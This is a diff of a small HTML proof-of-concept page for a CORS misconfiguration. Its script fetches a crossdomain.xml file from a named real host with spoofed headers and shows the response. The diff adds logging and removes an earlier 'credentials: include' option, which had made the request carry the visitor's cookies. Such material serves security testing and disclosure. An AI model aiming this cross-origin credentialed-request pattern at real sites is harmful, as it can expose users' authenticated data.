@@ -5,11 +5,12 @@
 </head>
 <body>
   <h1>CORS Misconfiguration PoC</h1>
-  <button id="exploitButton">Exploite</button>
+  <button id="exploitButton">Exploit</button>
   <div id="result"></div>
 
   <script>
     document.getElementById('exploitButton').onclick = function() {
+      console.log('Exploit button clicked');
       fetch('https://s7mbrstreamdual-ap.scene7.com/crossdomain.xml', {
         method: 'GET',
         headers: {
@@ -19,11 +20,14 @@
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
           'Connection': 'close',
           'Cache-Control': 'max-age=0'
-        },
-        credentials: 'include'
+        }
       })
-      .then(response => response.text())
+      .then(response => {
+        console.log('Response received');
+        return response.text();
+      })
       .then(data => {
+        console.log('Data fetched:', data);
         document.getElementById('result').innerText = data;
       })
       .catch(error => {
